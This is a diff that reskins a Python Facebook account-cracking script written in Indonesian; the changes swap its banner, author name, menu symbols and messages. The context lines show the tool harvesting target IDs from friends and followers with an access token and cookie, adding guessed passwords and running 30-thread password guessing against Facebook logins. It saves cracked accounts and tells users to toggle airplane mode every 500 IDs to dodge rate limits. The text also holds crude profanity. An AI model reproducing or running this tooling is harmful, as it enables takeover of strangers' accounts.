@@ -142,13 +142,13 @@ def back():
 #------------------[ LOGO-LAKNAT ]-----------------#
 def banner():
 	print(f'''\t{asu} ______                                              
-\t|_   _ \                                             
-\t  | |_) | _ .--.  ,--.   ____   ____  .---.  _ .--.  
-\t  |  __'.[ `/'`\]`'_\ : [_   ] [_   ]/ /__\\[ `/'`\]/S/R/2/6
-\t _| |__) || |    // | |, .' /_  .' /_| \__., | |     	
-\t|_______/[___]   \'-;__/[_____][_____]'.__.'[___]
+\t─▄───▄▄▄───▄─
+\t▀▀─▄█████▄─▀▀
+\t───█─▀█▀─█───
+\t──▄─▀█▀█▀─▄──
+\t▀█───█▀█───█▀
     	
-			{m}•{k}•{h}•{sir}•{b} Author : IKIWZ-XD {x}{m}•{k}•{h}•{x}''')
+			{m}•{k}•{h}•{sir}•{b} Author : OPIK ALEXANDER {x}{m}•{k}•{h}•{x}''')
 #--------------------[ BAGIAN-MASUK ]--------------#
 def login():
 	try:
@@ -185,7 +185,7 @@ def login_lagi334():
 	except Exception as e:
 		os.system("rm -f .token.txt")
 		os.system("rm -f .cok.txt")
-		print(f'  %s[%sx%s]%s LOGIN GAGAL.....CEK TUMBAL LUU NGAB !!%s'%(x,k,x,m,x))
+		print(f'  %s[%sx%s]%s LOGIN GAGAL.....CEK TUMBAL KAMU NGAB !!%s'%(x,k,x,m,x))
 		exit()
 def bot():
 	try:
@@ -210,12 +210,12 @@ def menu(my_name,my_id):
 	print(f' {m}•{h}•{p}       [•] Your Ip  : {ip}')
 	print(f' {k}•{h}•{p}•{b}{x}[•] Github   : {gh}')
 	print('')
-	print('  →[•] 1. Crack Publik     [ fitur √ ]')
-	print('  →[•] 2. Crack Pengikut   [ fitur √ ] ')
-	print('  →[•] 3. Crack Grup       [ Fitur X ] ')
-	print('  →[•] 4. Crack File       [ Fitur √ ]	')
-	print('  →[•] 5. Hasil Crack  ')
-	print('  →[•] 0. Keluar       ')
+	print('  →[✵] 1. Crack Publik     [ fitur √ ]')
+	print('  →[✵] 2. Crack Pengikut   [ fitur √ ] ')
+	print('  →[✵] 3. Crack Grup       [ Fitur X ] ')
+	print('  →[✵] 4. Crack File       [ Fitur √ ]	')
+	print('  →[✵] 5. Hasil Crack  ')
+	print('  →[✵] 0. Keluar       ')
 	_____alvino__adijaya_____ = input('\n•>> Pilih : ')
 	if _____alvino__adijaya_____ in ['1']:
 		dump_massal()
@@ -241,9 +241,9 @@ def error():
 	back()
 #-----------------[ HASIL-CRACK ]-----------------#
 def result():
-	print(f'[•] 1. Hasil {h}OK{x} Anda ')
-	print(f'[•] 2. Hasil {k}CP{x} Anda ')
-	print('[•] 3. Kembali	')
+	print(f'[✵] 1. Hasil {h}OK{x} Anda ')
+	print(f'[✵] 2. Hasil {k}CP{x} Anda ')
+	print('[✵] 3. Kembali	')
 	kz = input(f'\n>> Pilih : ')
 	if kz in ['2']:
 		try:vin = os.listdir('CP')
@@ -345,18 +345,18 @@ def dump_massal():
 	except IOError:
 		exit()
 	try:
-		jum = int(input('[•] Mau Berapa Target Mas/Mba ? : '))
+		jum = int(input('[✵] Mau Berapa Target Mas ? : '))
 	except ValueError:
-		print('[•] Masukkan Angka Anjing, Malah Huruff ')
+		print('[✵] Masukkan Angka Anjing, Malah Huruff ')
 		exit()
 	if jum<1 or jum>100:
-		print('[•] Gagal Dump Idz ')
+		print('[✵] Gagal Dump Id ')
 		exit()
 	ses=requests.Session()
 	yz = 0
 	for met in range(jum):
 		yz+=1
-		kl = input('[•] Masukkan Id Yang Ke '+str(yz)+' : ')
+		kl = input('[✵] Masukkan Id Yang Ke '+str(yz)+' : ')
 		uid.append(kl)
 	for userr in uid:
 		try:
@@ -374,14 +374,14 @@ def dump_massal():
 			exit()
 	try:
 		print('')
-		print(f'[•] Total Idz Yang Terkumpul👍{h}'+str(len(id)))
+		print(f'[✵] Total Id Yang Terkumpul☝️😅{h}'+str(len(id)))
 		setting()
 	except requests.exceptions.ConnectionError:
 		print(f'{x}')
-		print('[•] Sinyal Lo kek Kontol ')
+		print('[✵] Sinyal Lo kek Kontol ')
 		back()
 	except (KeyError,IOError):
-		print(f'[•]{k} Pertemanan Tidak Public {x}')
+		print(f'[✵]{k} Pertemanan Tidak Public {x}')
 		time.sleep(3)
 		back()
 #-------------------[ CRACK-PENGIKUT ]----------------#
@@ -391,20 +391,20 @@ def dump_pengikut():
 		cok = open('.cok.txt','r').read()
 	except IOError:
 		exit()
-	print('[•] Ketik ( me ) Jika Ingin Crack Follower Sendiri ')
+	print('[✵] Ketik ( me ) Jika Ingin Crack Follower Sendiri ')
 	pil = input('>> Masukkan Idz Target : ')
 	try:
 		koh2 = requests.get('https://graph.facebook.com/'+pil+'?fields=subscribers.limit(99999)&access_token='+tokenku[0],cookies={'cookie': cok}).json()
 		for pi in koh2['subscribers']['data']:
 			try:id.append(pi['id']+'|'+pi['name'])
 			except:continue
-		print(f'[•] Total Idz :{h} '+str(len(id)))
+		print(f'[✵] Total Idz :{h} '+str(len(id)))
 		setting()
 	except requests.exceptions.ConnectionError:
-		print('[•] Koneksi Internet Bermasalah ')
+		print('[✵] Koneksi Internet Bermasalah ')
 		exit()
 	except (KeyError,IOError):
-		print('[•] Gagal Mengambil Target ')
+		print('[✵] Gagal Mengambil Target ')
 		exit()
 #------------------[ CRACK-GRUP ]-----------------#
 balmond = b+"["+h+"✓"+b+"]"
@@ -575,11 +575,11 @@ def crack_file():
 		setting()
 #-------------[ PENGATURAN-IDZ ]---------------#
 def setting():
-	print(f'{x}[•] 1. Akun Old ')
-	print('[•] 2. Akun New ')
-	print('[•] 3. Random  [Rekomended]')
+	print(f'{x}[✵] 1. Akun Old ')
+	print('[✵] 2. Akun New ')
+	print('[✵] 3. Random  [Rekomended]')
 
-	hu = input('[•] Pilih==→ : ')
+	hu = input('[✵] Pilih==→ : ')
 	if hu in ['1','01']:
 		for tua in sorted(id):
 			id2.append(tua)
@@ -600,12 +600,12 @@ def setting():
 	else:
 		print('>> Pilih Yang Bener Kontooll ')
 		exit()
-	print('[•] 1. Mobile  [ rekomended ]')
-	print('[•] 2. Mbasic ')
-	print('[•] 3. Touch  ')
-	print('[•] 4. Mtouch ')
+	print('[✵] 1. Mobile  [ rekomended ]')
+	print('[✵] 2. Mbasic ')
+	print('[✵] 3. Touch  ')
+	print('[✵] 4. Mtouch ')
 	print('')
-	hc = input('[•] Pilih : ')
+	hc = input('[✵] Pilih : ')
 	if hc in ['1','01']:
 		method.append('mobile')
 	elif hc in ['']:
@@ -620,19 +620,19 @@ def setting():
 	else:
 		method.append('mobile')
 	print('')
-	_jembot_ = input('[•] Tambahkan Aplikasi ( Y/t ) ')
+	_jembot_ = input('[✵] Tambahkan Aplikasi ( Y/t ) ')
 	if _jembot_ in ['']:
-		print('[•] Pilih Yang Bener Kontol ')
+		print('[✵] Pilih Yang Bener Kontol ')
 		back()
 	elif _jembot_ in ['y','Y']:
 		taplikasi.append('ya')
 	else:
 		taplikasi.append('no')
-	pwplus=input('[•] Tambahkan Password Manual ( Y/t ) ')
+	pwplus=input('[✵] Tambahkan Password Manual ( Y/t ) ')
 	if pwplus in ['y','Y']:
 		pwpluss.append('ya')
 		cetak(nel('[[cyan]•[white]] Masukkan Katasandi Tambahan Minimal 6 Karakter\n[[cyan]•[white]] Contoh :[green] Sayang,indonesia,ngentot[white] '))
-		pwku=input('[•] Masukkan Password Tambahan : ')
+		pwku=input('[✵] Masukkan Password Tambahan : ')
 		pwkuh=pwku.split(',')
 		for xpw in pwkuh:
 			pwnya.append(xpw)
@@ -643,9 +643,9 @@ def setting():
 def passwrd():
 	print(f'[---------- {m}•{k}•{h}•{x}•{b}•{p} CRACK SEDANG BERLANGSUNG HARAP SABAR TOD !! {m}•{k}•{h}•{x} ----------] ')
 	print('')
-	print(f'[•] Hasil {h}OK{x} Tersimpan Di : {h}OK/%s {x}'%(okc))
-	print(f'[•] Hasil {k}CP{x} Tersimpan Di : {k}CP/%s {x}'%(cpc))
-	print(f'>>•<< Mainkan Mode Pesawat Setiap {m}500{x} Idz\n')
+	print(f'[✵] Hasil {h}OK{x} Tersimpan Di : {h}OK/%s {x}'%(okc))
+	print(f'[✵] Hasil {k}CP{x} Tersimpan Di : {k}CP/%s {x}'%(cpc))
+	print(f'>>✵<< Mainkan Mode Pesawat Setiap {m}500{x} Idz\n')
 	with tred(max_workers=30) as pool:
 		for yuzong in id2:
 			idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
@@ -697,7 +697,7 @@ def passwrd():
 def crack(idf,pwv):
 	global loop,ok,cp
 	bo = random.choice([m,k,h,b,u,x])
-	sys.stdout.write(f"\r🔥 {P}[{b}{loop}{P}/{u}{len(id)}{P}]—{P}[{H}{ok}{P}]—{P}[{k}{cp}{x}]—[{bo}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),
+	sys.stdout.write(f"\r🥶 {P}[{b}{loop}{P}/{u}{len(id)}{P}]—{P}[{H}{ok}{P}]—{P}[{k}{cp}{x}]—[{bo}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),
 	sys.stdout.flush()
 	ua = random.choice(ugen)
 	ua2 = random.choice(ugen2)
@@ -1126,7 +1126,7 @@ if __name__=='__main__':
 	except:pass
 	try:os.system('clear')
 	except:pass
-	alvino_xy(f'\n\t{x}[=]——> {h}WELCOME TO SCRIPT KIWZ-XD !!\n\t{x}[=]——> {h}Kenalin gw ikiw kls : XI TKJ A\n\t{x}[=]——> {h}ikiw Sehat Selalu Yah\n\t{x}[=]——> {h}Aminnn ....!!\n\t{x}[=]——> {h}SARAN PAKEK KARTU BUKAN WIFI ! !{x}')
+	alvino_xy(f'\n\t{x}[=]——> {h}WELCOME TO SCRIPT OPIK ALEXANDER !!\n\t{x}[=]——> {h}Kenalin gw Opik kls : XI Mipa-5 A\n\t{x}[=]——> {h}Opik Sehat Selalu Yah😇\n\t{x}[=]——> {h}Aminnn ....!!\n\t{x}[=]——> {h}SARAN PAKEK KARTU BUKAN WIFI ! !{x}')
 	time.sleep(2)
 	login()
 
